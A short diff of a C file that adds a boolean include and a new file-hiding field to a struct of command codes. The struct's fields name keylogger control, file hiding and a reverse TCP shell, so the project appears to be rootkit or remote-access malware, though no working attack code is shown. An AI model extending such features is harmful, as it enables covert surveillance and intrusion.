@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <stdbool.h>
 
 /**
  * Structs
@@ -24,6 +25,7 @@ typedef struct function_code {
 	int keylogger_disable;
 	int file_hide_add;
 	int file_hide_rm;
+	int file_hied_show;
 	int reverse_tcp_shell;
 } function_code;
 
